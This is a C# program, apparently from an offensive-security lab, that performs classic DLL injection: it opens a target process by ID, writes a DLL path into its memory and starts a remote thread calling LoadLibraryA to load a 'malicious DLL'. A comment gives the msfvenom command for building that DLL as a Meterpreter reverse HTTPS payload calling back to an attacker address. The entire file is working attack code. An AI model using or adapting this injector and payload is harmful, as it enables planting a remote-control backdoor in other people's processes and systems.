using System.Runtime.InteropServices;
using System;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Text;
using System.Diagnostics;
using System.Linq;
using System.Net;

namespace Classic_DLL_Injector
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
                // Download the malicious DLL
                String dirName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                String dllName = dirName + "\\m3t.dll";
                // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f dll -o met.dll


                // Get remote process handle
                int processId = 5256;
                // Process[] pList = Process.GetProcessesByName("explorer");
                // int processId = pList.First().Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);

                // Allocate space for the DLL name in remote process's virtual address space and write it
                IntPtr dllNameAddress = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                WriteProcessMemory(hProcess, dllNameAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

                // Locate base address of the LoadLibraryA function in kernel32.dll (this address will be the same for the remote process)
                IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                // Invoke LoadLibraryA function in the remote process supplying starting address of the malicious DLL in its (process's) address space
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, dllNameAddress, 0, IntPtr.Zero);
        }
    }
}
